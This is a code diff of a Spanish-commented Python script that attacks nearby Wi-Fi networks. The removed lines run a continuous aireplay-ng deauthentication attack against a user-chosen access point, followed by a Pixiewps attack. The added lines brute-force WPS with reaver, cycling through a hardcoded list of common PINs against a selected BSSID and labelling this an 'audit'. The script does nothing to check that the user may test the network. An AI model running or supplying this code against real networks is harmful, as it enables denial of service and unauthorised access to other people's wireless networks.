@@ -1,112 +1,73 @@
 import subprocess
-import time
+
+# Lista de pines WPS conocidos
+WPS_PINS = [
+    "12345670", "12345678", "00000000", "11111111", "12345671", "12345679", 
+    "55555555", "98765432", "87654321", "43218765"
+]
 
 def run_command(command, use_sudo=False):
-    """Ejecuta un comando de shell y muestra la salida"""
+    """Ejecuta un comando de shell y devuelve la salida."""
     if use_sudo:
         command = f"sudo {command}"
-    print(f"Ejecutando comando: {command}")
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
-    
-    if process.returncode == 0:
-        return stdout.decode()
-    else:
-        return stderr.decode()
+    return stdout.decode(), stderr.decode()
 
 def scan_wifi():
-    """Escanear redes Wi-Fi cercanas"""
+    """Escanea redes Wi-Fi y devuelve una lista de SSID y BSSID."""
     print("Escaneando redes Wi-Fi...\n")
-    result = run_command("iw dev wlan0 scan | grep SSID | awk -F ':' '{print $2}'", use_sudo=True)
-    
-    if not result:
-        print("No se encontraron redes Wi-Fi.\n")
-        return []
-    
-    networks = result.strip().split("\n")
-    networks = [net.strip() for net in networks if net.strip()]
-    
-    # Mostrar redes de forma atractiva
-    if networks:
-        print("Redes Wi-Fi encontradas:")
-        for idx, network in enumerate(networks, 1):
-            print(f"{idx}. {network}")
-    else:
-        print("No se encontraron redes Wi-Fi válidas.\n")
-    
+    stdout, _ = run_command("iw dev wlan0 scan | grep 'SSID\\|BSSID'")
+    networks = []
+    lines = stdout.splitlines()
+    current_bssid = None
+    for line in lines:
+        if "BSSID" in line:
+            current_bssid = line.split()[-1]
+        elif "SSID" in line:
+            ssid = line.split(":")[-1].strip()
+            if current_bssid and ssid:
+                networks.append((ssid, current_bssid))
+                current_bssid = None
     return networks
 
-def get_mac_address(ssid):
-    """Obtener la dirección MAC de una red Wi-Fi a partir de su SSID"""
-    print(f"Obteniendo MAC para la red: {ssid}\n")
-    result = run_command(f"iw dev wlan0 scan | grep '{ssid}' -A 5 | grep 'SSID' -A 10", use_sudo=True)
-    
-    mac = None
-    for line in result.splitlines():
-        if 'address' in line.lower():
-            mac = line.split(":")[1].strip()
-            break
-    
-    return mac
-
-def select_network(networks):
-    """Permitir al usuario seleccionar una red"""
-    if not networks:
-        print("No hay redes disponibles para seleccionar.\n")
-        return None
-    
-    while True:
-        try:
-            choice = int(input("\nSelecciona el número de la red que deseas atacar: "))
-            if 1 <= choice <= len(networks):
-                return networks[choice - 1]
-            else:
-                print("Número fuera de rango. Intenta nuevamente.")
-        except ValueError:
-            print("Por favor, ingresa un número válido.")
-
-def deauth_attack(target_mac):
-    """Realizar un ataque de desautenticación"""
-    print(f"Realizando ataque de desautenticación contra {target_mac}...\n")
-    result = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0", use_sudo=True)
-    print(result)
-    print("Ataque de desautenticación finalizado.\n")
-
-def pixiewps_attack(target_pcap):
-    """Realizar un ataque Pixiewps sobre un archivo pcap"""
-    print(f"Realizando ataque Pixiewps sobre {target_pcap}...\n")
-    result = run_command(f"pixiewps -r {target_pcap} -o cracked.txt", use_sudo=True)
-    print(result)
-    print("Ataque Pixiewps finalizado.\n")
+def attempt_wps_attack(bssid, ssid):
+    """Intenta conectar usando pines WPS conocidos."""
+    print(f"\nIntentando auditoría en la red: {ssid} ({bssid})\n")
+    for pin in WPS_PINS:
+        print(f"Probando PIN WPS: {pin}")
+        stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -p {pin} -vv", use_sudo=True)
+        if "WPS transaction completed" in stdout or "Success" in stdout:
+            print(f"¡Conexión exitosa con PIN: {pin}!")
+            return True
+    print("No se logró la conexión con los pines conocidos.\n")
+    return False
 
 def main():
     # Escanear redes Wi-Fi
     networks = scan_wifi()
-    
-    # Si no hay redes disponibles, terminar el script
     if not networks:
+        print("No se encontraron redes Wi-Fi.\n")
         return
-    
-    # Seleccionar la red
-    target_network = select_network(networks)
-    
-    if target_network:
-        print(f"\nHas seleccionado la red: {target_network}")
-    
-        # Obtener la dirección MAC de la red seleccionada
-        target_mac = get_mac_address(target_network)
-        
-        if target_mac:
-            print(f"Dirección MAC obtenida: {target_mac}")
-            # Realizar ataque de desautenticación
-            deauth_attack(target_mac)
-        else:
-            print("No se pudo obtener la dirección MAC de la red seleccionada.")
-        
-        # Realizar ataque Pixiewps
-        target_pcap = input("Introduce el archivo pcap para Pixiewps: ")
-        pixiewps_attack(target_pcap)
+
+    # Mostrar redes disponibles
+    print("\nRedes Wi-Fi detectadas:")
+    for i, (ssid, bssid) in enumerate(networks, start=1):
+        print(f"{i}. SSID: {ssid} | BSSID: {bssid}")
+
+    # Seleccionar red para auditar
+    try:
+        choice = int(input("\nSelecciona la red para auditar (número): "))
+        selected_ssid, selected_bssid = networks[choice - 1]
+        print(f"\nRed seleccionada: {selected_ssid} ({selected_bssid})")
+    except (ValueError, IndexError):
+        print("Selección inválida. Saliendo...")
+        return
+
+    # Intentar auditoría WPS
+    attempt_wps_attack(selected_bssid, selected_ssid)
 
 if __name__ == "__main__":
     main()
+
 
